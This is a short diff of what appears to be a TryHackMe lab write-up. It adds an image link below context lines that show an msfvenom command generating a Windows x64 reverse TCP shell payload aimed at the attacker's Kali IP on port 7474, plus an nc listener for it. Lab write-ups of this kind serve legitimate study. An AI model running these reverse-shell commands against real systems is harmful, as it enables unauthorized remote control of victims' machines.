@@ -102,3 +102,6 @@ $ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<Kali IP> LPORT=7474 -f
 ```
 $ nc -lvp 7474
 ```
+
+![image](https://github.com/yokohama/thm/assets/1023421/33cbaeee-37bc-4e0b-83cc-bb86328e6eb9)
+
